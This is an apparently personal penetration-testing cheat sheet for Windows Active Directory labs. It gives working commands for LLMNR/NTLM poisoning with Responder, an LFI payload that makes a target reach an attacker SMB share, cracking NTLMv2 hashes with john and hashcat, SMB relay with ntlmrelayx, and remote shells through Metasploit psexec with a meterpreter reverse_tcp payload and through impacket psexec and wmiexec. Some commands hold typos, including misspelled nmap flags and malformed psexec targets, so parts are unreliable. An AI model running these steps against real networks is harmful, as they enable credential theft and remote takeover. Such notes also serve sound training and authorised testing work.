# LLMNR
Use responder to connect back to a smb server youre runnign and grab the hashed credentials.
If its not installed, install [impacket](https://github.com/SecureAuthCorp/impacket)
```
Python Responder.py -I tun0 -rdw
```
Once you get a hash follow the "NTLM CRACK" section below.

# NTLM
Use responder to see if you can connect back to a smb server youre running and grab the hash credentials.
If its not installed install [impacket](https://github.com/SecureAuthCorp/impacket)
## This is if you got a webshell or lfi etc

```
sudo responder -I tun0
```
then on the browser
```
http://<IP-or-HOST>/index.php?page=//<attaker-ip>/somefile
```
## NTLM CRACK

copy the `NTLMv2-SSP Hash` 
```
echo "Administrator ........0" > hash.txt
```
use john to crack the hash
```
sudo john -w=/usr/share/wordlists/rockyou.txt hash.txt
```
or with hashcat
```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

# SMB Relay
Instead of cracking them just relay the hashes back if SMB signing is disabled
You will need to go into `responder` config, usually at `/usr/share/responder/Responder.conf`
And turn off `SMB` and `HTTP` to listen but not respond.

First check to see if smb singing is disabled
```
nmap --scirpt=smb2-security-mode.nse -p445 192.168.22.0/24
```
All the targets you find put their IP's in a target.txt file
Start responder
```
sudo responder -I eth0 -rdwv
```
and then setup the relay
```
ntlmrelayx -tf targets.txt -smb2support
```
get the hashes and crack or get a shell

to get a shell instead of hashes run
```
ntlmrelayx.py -tf targets.txt -smb2support -i
```
other options
`-e` for a executable- think msfvenom 
`-c` for a command like "whoami"

# Getting a shell using metasploit
Start metsploit
```
sudo msfconsole
```
search for psexec or use psexec
```
search psexec
#or
use 10
```
options:
```
set rhost 192.168.22.137
set smbdomain marvel.local
set smbpass Password1
set smbuser fcastle
set payload windows/x64/meterpreter/reverse_tcp
set lhost eth0
```
if powershell doesnt work use native target
```
show targets
set target 2
```

# Getting a shell with psexec
Use psexec natively
```
psexec.py <domain>/<user>:<password>@<host>
```
Example:
```
psexec.py marvel.local/fcastle:Password1:192.168.22.138
```
# Gettig a shell with wmiexec
```
wmiexec.py <domain>/<user>:<password>@<host>
```
```
wmiexec.py marvel.local/fcastle:Password1:192.168.22.138
```

